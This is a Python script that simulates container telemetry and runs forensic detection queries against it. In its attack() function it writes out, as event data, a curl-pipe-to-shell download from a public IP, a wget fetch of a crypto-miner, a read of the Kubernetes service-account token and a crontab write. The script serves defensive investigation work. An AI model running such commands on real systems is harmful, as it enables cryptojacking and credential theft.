"""Generate a realistic event stream (normal traffic + one web-shell -> crypto-miner attack) and run the
investigation queries against it.

    python simulate.py                 # in-memory database, prints the report
    python simulate.py --db f.db       # keep the database to poke at with the sqlite3 CLI
"""
import argparse
import random

from forensics import Forensics, install_default_policies

T0 = 1_732_600_000


def base(tenant, pod, ns="shop", cluster="prod-eu", image="app:1.0"):
    return {"tenant": tenant, "cluster": cluster, "namespace": ns, "pod": pod, "image": image}


def normal_traffic(rng):
    """Two tenants, several pods, boring legitimate activity. Includes PID reuse."""
    evs = []
    pods = [("acme", "payments-api-7f9c4", "php:8.3"), ("acme", "checkout-5d2b1", "node:20"),
            ("globex", "ledger-88a01", "java:21"), ("globex", "reports-1c3e9", "python:3.12")]
    servers = {"php:8.3": "php-fpm", "node:20": "node", "java:21": "java", "python:3.12": "python3"}
    for tenant, pod, image in pods:
        b = base(tenant, pod, image=image)
        server = servers[image]
        evs.append({**b, "kind": "exec", "ts": T0, "pid": 1, "ppid": 0, "exe": "/pause", "uid": 0})
        evs.append({**b, "kind": "exec", "ts": T0 + 1, "pid": 7, "ppid": 1, "exe": server, "args": "--serve", "uid": 33})
        t = T0 + 5
        for i in range(120):
            t += rng.randint(5, 40)
            evs.append({**b, "kind": "network", "ts": t, "pid": 7, "dst_ip": f"10.0.{rng.randint(0, 9)}.{rng.randint(2, 250)}",
                        "dst_port": rng.choice([5432, 6379, 443]), "proto": "tcp"})
            if i % 15 == 0:
                evs.append({**b, "kind": "file", "ts": t, "pid": 7, "path": f"/app/cache/{rng.getrandbits(32):08x}", "op": "write"})
            if i % 40 == 0:  # a health-check helper that exits; its pid gets reused later
                evs.append({**b, "kind": "exec", "ts": t, "pid": 300 + i, "ppid": 7, "exe": "/usr/local/bin/healthcheck", "uid": 33})
                evs.append({**b, "kind": "exit", "ts": t + 1, "pid": 300 + i})
    return evs


def attack():
    """acme/payments-api: RCE in the PHP app -> shell -> curl | sh -> miner + token theft."""
    b = base("acme", "payments-api-7f9c4", image="php:8.3")
    t = T0 + 1800
    evs = [
        {**b, "kind": "exec", "ts": t, "pid": 4242, "ppid": 7, "exe": "/bin/sh",
         "args": "-c curl -s http://45.33.12.9/x.sh | sh", "uid": 33},
        {**b, "kind": "exec", "ts": t + 1, "pid": 4243, "ppid": 4242, "exe": "/usr/bin/curl",
         "args": "-s http://45.33.12.9/x.sh", "uid": 33},
        {**b, "kind": "network", "ts": t + 1, "pid": 4243, "dst_ip": "45.33.12.9", "dst_port": 80, "proto": "tcp"},
        {**b, "kind": "exit", "ts": t + 2, "pid": 4243},
        {**b, "kind": "exec", "ts": t + 2, "pid": 4244, "ppid": 4242, "exe": "/bin/sh", "args": "x.sh", "uid": 33},
        {**b, "kind": "file", "ts": t + 3, "pid": 4244, "path": "/var/run/secrets/kubernetes.io/serviceaccount/token", "op": "read"},
        {**b, "kind": "exec", "ts": t + 4, "pid": 4245, "ppid": 4244, "exe": "/usr/bin/wget",
         "args": "-q -O /tmp/.k http://45.33.12.9/xmrig", "uid": 33},
        {**b, "kind": "network", "ts": t + 4, "pid": 4245, "dst_ip": "45.33.12.9", "dst_port": 80, "proto": "tcp"},
        {**b, "kind": "exit", "ts": t + 6, "pid": 4245},
        {**b, "kind": "file", "ts": t + 6, "pid": 4244, "path": "/etc/crontab", "op": "write"},
        {**b, "kind": "exec", "ts": t + 7, "pid": 4246, "ppid": 4244, "exe": "/tmp/.k", "args": "-o 45.33.12.9:3333 --threads 4", "uid": 33},
    ]
    for i in range(40):                     # the miner reconnecting to its pool: a burst
        evs.append({**b, "kind": "network", "ts": t + 8 + i, "pid": 4246, "dst_ip": "45.33.12.9", "dst_port": 3333, "proto": "tcp"})
    return evs


def show(title, rows, cols=None):
    print(f"\n### {title}")
    if not rows:
        print("  (none)")
        return
    cols = cols or rows[0].keys()
    w = {c: min(max(len(str(c)), *(len(str(r[c])) for r in rows)), 48) for c in cols}
    print("  " + "  ".join(str(c).ljust(w[c]) for c in cols))
    for r in rows:
        print("  " + "  ".join(str(r[c])[:48].ljust(w[c]) for c in cols))


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("--db", default=":memory:")
    a = ap.parse_args(argv)
    rng = random.Random(1)
    f = Forensics(a.db)
    install_default_policies(f)
    stream = sorted(normal_traffic(rng) + attack(), key=lambda e: e["ts"])
    f.ingest(stream)
    n_ev = f.db.execute("SELECT count(*) FROM events").fetchone()[0]
    n_pr = f.db.execute("SELECT count(*) FROM processes").fetchone()[0]
    print(f"ingested {len(stream)} raw events -> {n_ev} events, {n_pr} processes")

    show("Open alerts, top 3 per tenant (ROW_NUMBER over severity, hits)", f.q("top_alerts", n=3))
    show("Kill chain: app server -> shell -> outbound to public IP within 60s (recursive CTE)",
         f.q("kill_chain", window=60))
    miner = f.process_id("acme", "payments-api-7f9c4", "/tmp/.k")
    show("Ancestry of the miner process (recursive CTE, child -> root)", f.q("ancestry", process_id=miner))
    shell = f.process_id("acme", "payments-api-7f9c4", "/bin/sh")
    show("Blast radius of the first shell (recursive CTE + aggregation)", f.q("blast_radius", process_id=shell),
         ["depth", "pid", "exe", "events", "net", "file", "destinations", "paths"])
    show("Bursts: peak events per pod in any 30s window (window functions)",
         f.q("bursts", tenant_id=f.tenant("acme"), window=30, threshold=5))
    show("Who else contacted 45.33.12.9? (expression index on detail.dst_ip)", f.q("who_contacted", ip="45.33.12.9")[:5])
    show("Full-text search 'secrets' in acme (FTS5, BM25)", f.q("search", q="secrets", tenant_id=f.tenant("acme"), limit=3))

    top = f.db.execute("SELECT id FROM alerts WHERE severity = 'critical' ORDER BY id LIMIT 1").fetchone()[0]
    f.set_status(top, "acknowledged", "analyst:priya")
    f.set_status(top, "resolved", "analyst:priya")
    try:
        f.set_status(top, "open", "analyst:mallory")
    except Exception as e:
        print(f"\nreopening a resolved alert is refused by a trigger: {e}")
    show("Audit trail written by trigger", f.db.execute("SELECT * FROM alert_history").fetchall())
    return f


if __name__ == "__main__":
    main()
